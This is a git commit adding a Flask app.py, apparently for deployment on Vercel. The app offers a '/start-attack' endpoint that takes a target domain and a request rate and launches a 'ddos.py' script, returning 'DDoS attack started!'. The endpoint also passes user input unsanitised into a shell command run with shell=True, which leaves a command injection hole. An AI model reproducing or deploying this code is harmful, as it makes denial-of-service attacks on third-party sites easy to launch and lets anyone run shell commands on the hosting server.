2e7b6b751062ec1f69a66957b21e2734185f44ac
FD LORD / FAMOUS-TECH <167099698+Azorwolldens@users.noreply.github.com>
2024-06-26 16:10:42 -0400

    app.py for vercel app

---
+++ app.py
@@ -0,0 +1,26 @@
+from flask import Flask, request, jsonify
+import subprocess
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return app.send_static_file('index.html')
+
+@app.route('/start-attack', methods=['POST'])
+def start_attack():
+    data = request.json
+    domain = data.get('domain')
+    rps = data.get('rps')
+    language = data.get('language')
+    
+    if not domain or not rps:
+        return jsonify({'message': 'Domain and Requests per Second are required!'}), 400
+
+    command = f'python3 ddos.py domain {domain} {rps}'
+    process = subprocess.Popen(command, shell=True)
+
+    return jsonify({'message': 'DDoS attack started!'})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
